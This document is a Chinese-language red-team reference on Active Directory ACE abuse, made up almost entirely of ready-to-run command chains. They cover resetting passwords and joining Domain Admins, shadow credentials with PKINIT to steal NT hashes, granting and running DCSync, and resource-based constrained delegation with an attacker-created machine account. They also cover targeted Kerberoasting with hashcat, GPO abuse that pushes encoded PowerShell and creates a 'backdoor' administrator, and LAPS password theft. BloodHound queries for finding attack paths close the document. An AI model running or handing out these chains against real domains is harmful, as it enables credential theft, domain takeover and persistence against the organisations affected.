# ACE 滥用完整利用链参考

Active Directory 中的访问控制项 (ACE) 定义了谁对哪个对象拥有什么权限。错误配置的 ACE 可以被用于权限提升、凭据窃取和持久化。

---

## 1. ACE 类型与权限掩码

### 关键权限及其十六进制值

| 权限名称 | 十六进制值 | 含义 |
|----------|------------|------|
| GenericAll | `0x10000000` | 完全控制（读/写/删除/修改权限） |
| GenericWrite | `0x40000000` | 写入所有可写属性 |
| WriteDACL | `0x00040000` | 修改对象的访问控制列表 |
| WriteOwner | `0x00080000` | 修改对象的所有者 |
| WriteProperty | `0x00000020` | 写入特定属性 |
| Self | `0x00000008` | 对自身执行验证写入（如加入组） |
| ExtendedRight | `0x00000100` | 扩展权限（如强制改密码） |
| ForceChangePassword | GUID: `00299570-246d-11d0-a768-00aa006e0529` | 无需知道旧密码直接重置 |
| User-Force-Change-Password | 同上 | 别名 |

### 常见扩展权限 GUID

```
# DS-Replication-Get-Changes
1131f6aa-9c07-11d1-f79f-00c04fc2dcd2

# DS-Replication-Get-Changes-All (DCSync 需要此权限)
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

# User-Force-Change-Password
00299570-246d-11d0-a768-00aa006e0529

# Self-Membership (AddSelf to group)
bf9679c0-0de6-11d0-a285-00aa003049e2

# ms-Mcs-AdmPwd (LAPS)
UUID varies — 通过 schema 查询

# AllowedToDelegate
UUID varies
```

---

## 2. GenericAll 滥用

### 2.1 对用户对象的 GenericAll

拥有用户对象的 GenericAll 权限 = 完全控制该用户。

```bash
# 方法1: 直接重置密码（不需要知道旧密码）
net rpc password "TARGET_USER" "NewP@ss123!" -U "DOMAIN/ATTACKER%Password" -S DC_IP

# 使用 impacket
python3 changepasswd.py DOMAIN/TARGET_USER:OldPass@DC_IP -newpass 'NewP@ss123!' -altuser ATTACKER -altpass 'AttackerPass'

# 方法2: 设置 SPN 实施 Kerberoasting（Targeted Kerberoasting）
python3 targetedKerberoast.py -u ATTACKER -p 'Password' -d DOMAIN --dc-ip DC_IP -t TARGET_USER

# 或手动设置 SPN
python3 addspn.py -u 'DOMAIN\ATTACKER' -p 'Password' -t 'TARGET_USER' -s 'HTTP/fake.corp.local' DC_IP

# 方法3: 配置 Shadow Credentials
python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' --target TARGET_USER --action add --dc-ip DC_IP

# 方法4: 关闭预认证实施 AS-REP Roasting
# 通过 PowerShell (域内):
Set-ADAccountControl -Identity TARGET_USER -DoesNotRequirePreAuth $true
# 通过 impacket:
python3 bloodyAD.py -d DOMAIN -u ATTACKER -p 'Password' --host DC_IP set object TARGET_USER userAccountControl -v 4194304
```

### 2.2 对组对象的 GenericAll

```bash
# 直接将自己加入组
net rpc group addmem "Domain Admins" "ATTACKER" -U "DOMAIN/ATTACKER%Password" -S DC_IP

# 使用 bloodyAD
python3 bloodyAD.py -d DOMAIN -u ATTACKER -p 'Password' --host DC_IP add groupMember "Domain Admins" ATTACKER

# 使用 PowerShell (域内)
Add-ADGroupMember -Identity "Domain Admins" -Members ATTACKER

# 使用 net (域内)
net group "Domain Admins" ATTACKER /add /domain
```

### 2.3 对计算机对象的 GenericAll

```bash
# 方法1: 配置 RBCD (Resource-Based Constrained Delegation)
# 详见第 7 节

# 方法2: Shadow Credentials
python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' --target 'TARGET_PC$' --action add --dc-ip DC_IP

# 方法3: 读取 LAPS 密码（如果安装了 LAPS）
netexec ldap DC_IP -u ATTACKER -p 'Password' -M laps

# 方法4: 修改 msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
python3 rbcd.py -delegate-from 'ATTACKER_PC$' -delegate-to 'TARGET_PC$' -action write 'DOMAIN/ATTACKER:Password' -dc-ip DC_IP
```

### 2.4 对 GPO 的 GenericAll

```bash
# 使用 SharpGPOAbuse (域内 Windows)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ATTACKER --GPOName "Default Domain Policy"
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net localgroup administrators ATTACKER /add" --GPOName "Default Domain Policy"

# 使用 pyGPOAbuse (Linux)
python3 pygpoabuse.py DOMAIN/ATTACKER:'Password' -gpo-id "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX" -command 'net localgroup administrators ATTACKER /add' -dc-ip DC_IP
```

### 2.5 对 OU 的 GenericAll

```bash
# 通过 OU 继承影响 OU 下所有对象
# 方法: 向 OU 添加 ACE，授予自己对 OU 内所有子对象的权限

python3 dacledit.py -action write -rights FullControl \
  -principal ATTACKER -target-dn "OU=Servers,DC=corp,DC=local" \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP
```

---

## 3. WriteDACL 权限提升

拥有 WriteDACL 可以修改目标对象的 ACL，授予自己任意权限。

### 逐步操作（使用 dacledit.py）

```bash
# 步骤1: 查看当前 ACL
python3 dacledit.py -action read -target TARGET_USER 'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 步骤2: 授予自己 GenericAll 权限
python3 dacledit.py -action write -rights FullControl \
  -principal ATTACKER -target TARGET_USER \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 步骤3: 现在可以重置密码 / Kerberoast / Shadow Creds
python3 changepasswd.py DOMAIN/TARGET_USER@DC_IP -newpass 'NewP@ss123!' -altuser ATTACKER -altpass 'Password'

# 步骤4: 清理 — 删除添加的 ACE
python3 dacledit.py -action remove -rights FullControl \
  -principal ATTACKER -target TARGET_USER \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP
```

### 授予 DCSync 权限

```bash
# 授予 DCSync 所需的两个扩展权限
python3 dacledit.py -action write -rights DCSync \
  -principal ATTACKER -target-dn "DC=corp,DC=local" \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 执行 DCSync
python3 secretsdump.py DOMAIN/ATTACKER:'Password'@DC_IP -just-dc-ntlm

# 清理
python3 dacledit.py -action remove -rights DCSync \
  -principal ATTACKER -target-dn "DC=corp,DC=local" \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP
```

---

## 4. WriteOwner → WriteDACL → GenericAll 链

三步提升链：先成为对象所有者，再修改 DACL，最后获得完全控制。

```bash
# 步骤1: 修改目标对象的所有者为自己
# 使用 impacket owneredit.py
python3 owneredit.py -action write -new-owner ATTACKER \
  -target TARGET_USER 'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 步骤2: 作为所有者，授予自己 WriteDACL 权限（所有者隐含此权限）
# 然后授予 GenericAll
python3 dacledit.py -action write -rights FullControl \
  -principal ATTACKER -target TARGET_USER \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 步骤3: 利用 GenericAll 权限
# 重置密码
python3 changepasswd.py DOMAIN/TARGET_USER@DC_IP -newpass 'NewP@ss123!' -altuser ATTACKER -altpass 'Password'

# 完整链示例 (从 WriteOwner 到域管):
# ATTACKER --WriteOwner--> svc_admin --WriteDACL--> GenericAll --> 重置密码 --> svc_admin 是 Domain Admins 成员
```

### 清理（逆序恢复）

```bash
# 1. 恢复原始 ACE
python3 dacledit.py -action remove -rights FullControl \
  -principal ATTACKER -target TARGET_USER \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 2. 恢复原始所有者
python3 owneredit.py -action write -new-owner ORIGINAL_OWNER \
  -target TARGET_USER 'DOMAIN/ATTACKER:Password' -dc-ip DC_IP
```

---

## 5. Shadow Credentials 完整链

利用对目标对象的写权限（GenericAll / GenericWrite / WriteProperty on msDS-KeyCredentialLink），添加影子凭据实现 PKINIT 认证获取 TGT。

### 完整流程

```bash
# 前提: 域内存在 ADCS (Active Directory Certificate Services) 或域功能级别 >= 2016
# 且攻击者对目标有 msDS-KeyCredentialLink 写权限

# 步骤1: 添加 Shadow Credential (pywhisker)
python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' \
  --target TARGET_USER --action add --dc-ip DC_IP
# 输出:
# [*] Updated the msDS-KeyCredentialLink attribute of TARGET_USER
# [*] DeviceID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
# [*] PFX certificate and target info saved to: xxxxx.pfx
# [*] PFX password: xxxxx

# 步骤2: 使用 PKINIT 获取 TGT (PKINITtools)
python3 gettgtpkinit.py -cert-pfx xxxxx.pfx -pfx-pass 'xxxxx' \
  DOMAIN/TARGET_USER TARGET_USER.ccache -dc-ip DC_IP
# 输出: TGT 保存为 TARGET_USER.ccache

# 步骤3: 获取 NT Hash (PKINITtools - U2U)
export KRB5CCNAME=TARGET_USER.ccache
python3 getnthash.py -key AS_REP_KEY_FROM_STEP2 DOMAIN/TARGET_USER -dc-ip DC_IP
# 输出: TARGET_USER 的 NTLM hash

# 步骤4: 使用 NT Hash 进行 Pass-the-Hash
python3 secretsdump.py -hashes :NTHASH DOMAIN/TARGET_USER@DC_IP
# 或
netexec smb DC_IP -u TARGET_USER -H NTHASH
```

### 针对计算机账户

```bash
# 对计算机账户同样有效 — 获取计算机账户的 TGT 后可以 DCSync
python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' \
  --target 'DC01$' --action add --dc-ip DC_IP

python3 gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass 'xxxxx' \
  'DOMAIN/DC01$' dc01.ccache -dc-ip DC_IP

export KRB5CCNAME=dc01.ccache
python3 getnthash.py -key AS_REP_KEY 'DOMAIN/DC01$' -dc-ip DC_IP

# 使用 DC 机器账户 hash 进行 DCSync
python3 secretsdump.py -hashes :DC_NTHASH 'DOMAIN/DC01$'@DC_IP -just-dc-ntlm
```

### 清理

```bash
# 列出目标的所有 Shadow Credentials
python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' \
  --target TARGET_USER --action list --dc-ip DC_IP

# 删除指定的 DeviceID
python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' \
  --target TARGET_USER --action remove --device-id DEVICE_ID --dc-ip DC_IP
```

---

## 6. Targeted Kerberoasting（SPN 操纵）

对目标用户有写权限时，可以为其设置 SPN 然后请求服务票据进行离线破解。

```bash
# 步骤1: 为目标用户设置 SPN
python3 addspn.py -u 'DOMAIN\ATTACKER' -p 'Password' \
  -t TARGET_USER -s 'HTTP/fake.corp.local' DC_IP

# 或使用 bloodyAD
python3 bloodyAD.py -d DOMAIN -u ATTACKER -p 'Password' --host DC_IP \
  set object TARGET_USER servicePrincipalName -v 'HTTP/fake.corp.local'

# 步骤2: 请求服务票据
python3 GetUserSPNs.py DOMAIN/ATTACKER:'Password' -dc-ip DC_IP \
  -request -target-user TARGET_USER -outputfile targeted_tgs.txt

# 步骤3: 离线破解
hashcat -m 13100 targeted_tgs.txt wordlist.txt -r best64.rule -O -w 3

# 清理: 删除 SPN
python3 addspn.py -u 'DOMAIN\ATTACKER' -p 'Password' \
  -t TARGET_USER -s 'HTTP/fake.corp.local' DC_IP -r   # -r = remove
```

---

## 7. RBCD（基于资源的约束委派）完整链

当拥有目标计算机的 GenericAll/GenericWrite/WriteProperty(msDS-AllowedToActOnBehalfOfOtherIdentity) 权限时。

```bash
# 前提: 需要一个受控的计算机账户（可以通过 MAQ 创建）

# 步骤1: 创建机器账户（利用 ms-DS-MachineAccountQuota，默认值 10）
python3 addcomputer.py -computer-name 'EVIL_PC$' -computer-pass 'EvilPass123!' \
  -dc-ip DC_IP 'DOMAIN/ATTACKER:Password'

# 步骤2: 配置 RBCD — 允许 EVIL_PC 代表任何用户访问 TARGET_PC
python3 rbcd.py -delegate-from 'EVIL_PC$' -delegate-to 'TARGET_PC$' \
  -action write 'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 步骤3: 请求 S4U2Self + S4U2Proxy 票据（模拟 Administrator 访问 TARGET_PC）
python3 getST.py -spn cifs/TARGET_PC.corp.local \
  -impersonate Administrator \
  -dc-ip DC_IP 'DOMAIN/EVIL_PC$:EvilPass123!'
# 输出: Administrator@cifs_TARGET_PC.corp.local.ccache

# 步骤4: 使用票据访问目标
export KRB5CCNAME=Administrator@cifs_TARGET_PC.corp.local.ccache

python3 secretsdump.py -k -no-pass TARGET_PC.corp.local
python3 wmiexec.py -k -no-pass TARGET_PC.corp.local
python3 smbexec.py -k -no-pass TARGET_PC.corp.local
netexec smb TARGET_PC.corp.local -k --use-kcache
```

### 清理

```bash
# 删除 RBCD 配置
python3 rbcd.py -delegate-from 'EVIL_PC$' -delegate-to 'TARGET_PC$' \
  -action flush 'DOMAIN/ATTACKER:Password' -dc-ip DC_IP

# 删除创建的机器账户
python3 addcomputer.py -computer-name 'EVIL_PC$' -computer-pass 'EvilPass123!' \
  -dc-ip DC_IP 'DOMAIN/ATTACKER:Password' -delete
```

---

## 8. GPO 滥用

对 GPO 有写权限（GenericAll/GenericWrite）时，可以推送恶意策略到链接该 GPO 的 OU 中所有计算机。

### 确认 GPO 写权限

```bash
# 枚举可写 GPO
python3 dacledit.py -action read -target-dn "CN={GPO-GUID},CN=Policies,CN=System,DC=corp,DC=local" \
  'DOMAIN/ATTACKER:Password' -dc-ip DC_IP
```

### 利用方法

```bash
# 方法1: 添加本地管理员
python3 pygpoabuse.py 'DOMAIN/ATTACKER:Password' \
  -gpo-id "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX" \
  -command 'net localgroup administrators DOMAIN\ATTACKER /add' \
  -dc-ip DC_IP -f

# 方法2: 创建即时任务执行命令
python3 pygpoabuse.py 'DOMAIN/ATTACKER:Password' \
  -gpo-id "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX" \
  -command 'powershell -enc BASE64_PAYLOAD' \
  -dc-ip DC_IP -f

# 方法3: 使用 SharpGPOAbuse (Windows)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount ATTACKER --GPOName "VulnGPO"
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author SYSTEM \
  --Command "cmd.exe" --Arguments "/c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add" \
  --GPOName "VulnGPO"
```

### 强制 GPO 更新

```bash
# 默认 GPO 每 90 分钟刷新一次，可以强制更新
# 远程触发（如果有 WinRM 权限）
netexec smb TARGET_PC -u ATTACKER -p 'Password' -x 'gpupdate /force'
# 否则等待最多 90 分钟
```

### 清理

```bash
# 恢复 GPO: pygpoabuse 会备份原始 GPT.INI，用备份恢复
# 或手动删除创建的计划任务/组策略项
```

---

## 9. LAPS 密码读取

如果账户拥有 ReadLAPSPassword ACE（`ms-Mcs-AdmPwd` 读取权限），可以直接获取目标计算机的本地管理员密码。

```bash
# 方法1: netexec (推荐)
netexec ldap DC_IP -u ATTACKER -p 'Password' -M laps

# 方法2: impacket
python3 Get-LAPSPasswords.py DOMAIN/ATTACKER:'Password' -dc-ip DC_IP

# 方法3: ldapsearch
ldapsearch -x -H ldap://DC_IP -D "ATTACKER@DOMAIN" -w 'Password' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# 方法4: bloodyAD
python3 bloodyAD.py -d DOMAIN -u ATTACKER -p 'Password' --host DC_IP \
  get object 'TARGET_PC$' --attr ms-Mcs-AdmPwd

# LAPS v2 (Windows LAPS) — 属性名不同
# msLAPS-Password / msLAPS-EncryptedPassword
netexec ldap DC_IP -u ATTACKER -p 'Password' -M laps
# netexec 会自动处理 v1 和 v2
```

### 利用 LAPS 密码

```bash
# 获取到的密码是目标计算机的本地管理员密码
LAPS_PASS="获取到的密码"

# 远程执行
netexec smb TARGET_PC -u Administrator -p "$LAPS_PASS" --local-auth -x 'whoami'
python3 wmiexec.py ./Administrator:"$LAPS_PASS"@TARGET_PC
python3 psexec.py ./Administrator:"$LAPS_PASS"@TARGET_PC
```

---

## 10. 各技术清理命令汇总

| 技术 | 清理命令 |
|------|----------|
| GenericAll → 改密码 | 改回原始密码（需记录原始 hash） |
| GenericAll → 加入组 | `net rpc group delmem "GROUP" "ATTACKER" -U ...` |
| WriteDACL → 添加 ACE | `dacledit.py -action remove -rights FullControl ...` |
| WriteOwner → 改所有者 | `owneredit.py -action write -new-owner ORIGINAL_OWNER ...` |
| Shadow Credentials | `pywhisker.py --action remove --device-id DEVICE_ID ...` |
| Targeted Kerberoasting | `addspn.py ... -r` 删除 SPN |
| RBCD | `rbcd.py -action flush ...` + 删除机器账户 |
| GPO 滥用 | 恢复原始 GPT.INI / 删除计划任务 |
| 关闭预认证 | 重新启用 Kerberos 预认证 |
| DCSync ACE | `dacledit.py -action remove -rights DCSync ...` |

---

## 11. BloodHound Cypher 查询

### 查找可利用的 ACE 路径

```cypher
// 查找所有到 Domain Admins 的最短 ACE 路径
MATCH p=shortestPath((u:User)-[r*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
WHERE u.name <> "ADMINISTRATOR@CORP.LOCAL"
AND ALL(rel IN relationships(p) WHERE type(rel) IN [
    'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner',
    'Owns', 'ForceChangePassword', 'AddMember', 'AllExtendedRights'
])
RETURN p
```

### 查找 GenericAll 权限

```cypher
// 非管理员用户对其他用户的 GenericAll
MATCH p=(u:User)-[:GenericAll]->(t:User)
WHERE NOT u.name STARTS WITH 'ADMINISTRATOR'
AND NOT u.name STARTS WITH 'KRBTGT'
RETURN p

// 对组的 GenericAll
MATCH p=(u:User)-[:GenericAll]->(g:Group)
WHERE g.name CONTAINS 'ADMIN'
RETURN p

// 对计算机的 GenericAll
MATCH p=(u:User)-[:GenericAll]->(c:Computer)
RETURN p
```

### 查找 WriteDACL 和 WriteOwner

```cypher
// WriteDACL 到高价值目标
MATCH p=(u:User)-[:WriteDacl]->(t)
WHERE t.highvalue = true
RETURN p

// WriteOwner
MATCH p=(u:User)-[:WriteOwner]->(t)
WHERE t.highvalue = true
RETURN p

// WriteDACL + WriteOwner 链
MATCH p=(u:User)-[:WriteOwner|WriteDacl*1..3]->(t)
WHERE t.highvalue = true
RETURN p
```

### 查找 Shadow Credentials 可利用目标

```cypher
// 对计算机有 GenericAll/GenericWrite 的用户（可做 Shadow Credentials）
MATCH p=(u:User)-[:GenericAll|GenericWrite]->(c:Computer)
RETURN p

// 对用户有写 msDS-KeyCredentialLink 权限的
MATCH p=(u:User)-[:AddKeyCredentialLink]->(t)
RETURN p
```

### 查找 RBCD 攻击路径

```cypher
// 对计算机有写权限且存在可控机器账户的路径
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl]->(c:Computer)
WHERE u.owned = true
RETURN p

// 查看哪些计算机配置了 RBCD
MATCH p=(c1:Computer)-[:AllowedToAct]->(c2:Computer)
RETURN p
```

### 查找 GPO 滥用路径

```cypher
// 对 GPO 有写权限的用户
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(g:GPO)
RETURN p

// GPO 链接到的 OU 及其包含的计算机
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer)
WHERE g.name = "TARGET_GPO@CORP.LOCAL"
RETURN g, ou, c
```

### 查找 LAPS 可读目标

```cypher
// 拥有 ReadLAPSPassword 权限的用户
MATCH p=(u:User)-[:ReadLAPSPassword]->(c:Computer)
RETURN p

// 通过组继承获得 LAPS 读取权限
MATCH p=(u:User)-[:MemberOf*1..3]->(g:Group)-[:ReadLAPSPassword]->(c:Computer)
RETURN p
```

### 综合高价值路径发现

```cypher
// 从已控账户出发，查找所有 ACE 可达路径（深度 <= 5）
MATCH p=shortestPath((u {owned:true})-[r*1..5]->(t {highvalue:true}))
WHERE ALL(rel IN relationships(p) WHERE type(rel) IN [
    'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner',
    'Owns', 'ForceChangePassword', 'AddMember', 'AllExtendedRights',
    'AddKeyCredentialLink', 'ReadLAPSPassword', 'MemberOf',
    'DCSync', 'GetChanges', 'GetChangesAll'
])
RETURN p
ORDER BY length(p) ASC
LIMIT 20
```

---

## 参考链接

- [BloodHound - Abuse Info](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)
- [The Hacker Recipes - ACE Abuse](https://www.thehacker.recipes/ad/movement/dacl)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [pywhisker - GitHub](https://github.com/ShutdownRepo/pywhisker)
- [PKINITtools - GitHub](https://github.com/dirkjanm/PKINITtools)
- [dacledit.py - GitHub](https://github.com/fortra/impacket/blob/main/examples/dacledit.py)
- [bloodyAD - GitHub](https://github.com/CravateRouge/bloodyAD)
